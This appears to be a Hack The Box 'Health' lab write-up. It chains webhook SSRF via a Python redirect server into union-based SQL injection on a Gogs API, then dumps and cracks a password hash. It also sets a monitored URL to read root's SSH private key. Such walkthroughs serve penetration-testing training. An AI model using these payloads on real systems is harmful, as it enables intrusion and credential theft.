Hack The Box :Health

Initial enumeration
Nmap scan

```bash
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2 usual open ports and one filltered port 3000

Accessing port 80 through browser it is an php larveral web application and it has a function called webhook
let's find more about webhook
**Webhooks are generally automated calls made from one application to another, triggered whenever a specific event occurs
a.k.a "user generatered callbacks"**

Now the attack time. The attack surface is "SSRF"

webhook ssrf referance [link](https://www.youtube.com/watch?v=xF2XUKtYaTg&list=LL) 

redirect.py
```python
#!/usr/bin/env python3

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("""
Usage: {} <port_number> <url>
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

sqli

union based injection

27 columns
```
sudo python3 redirect.py 80 "http://localhost:3000/api/v1/users/search?q=')/**/ORDER/**/BY/**/27--"
```

enumerating sql databases,tables,columns

we aleady know this is a opensource web app so we can read the source code from git rep of [gogs git](https://github.com/gogs/gogs) from git repo [https://github.com/gogs/gogs/tree/main/internal/db](https://github.com/gogs/gogs/tree/main/internal/db)

username

```
 sudo python3 redirect.py 80 "http://localhost:3000/api/v1/users/search?q=')/**/UNION/**/ALL/**/SELECT/**/1,10,(SELECT/**/name/**/from/**/user),4,12,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--" 
 ```
username : susanne
```
sudo python3 redirect.py 80 "http://localhost:3000/api/v1/users/search?q=')/**/UNION/**/ALL/**/SELECT/**/1,10,(SELECT/**/passwd/**/from/**/user),4,12,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
```
passwd : 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37cd

```
sudo python3 redirect.py 80 "http://localhost:3000/api/v1/users/search?q=')/**/UNION/**/ALL/**/SELECT/**/1,10,(SELECT/**/salt/**/from/**/user),4,12,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
```
salt : sO3XIbeW14

cracked the hash using hashcat

sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15

user as susanne 

privilege escalation

acccess mysql user as laravel and passwd MYsql_strongestpass@2014+

mysql laravel --execute TRUNCATE tasks 

UPDATE tasks SET monitoredUrl = 'file:///root/.ssh/id_rsa';
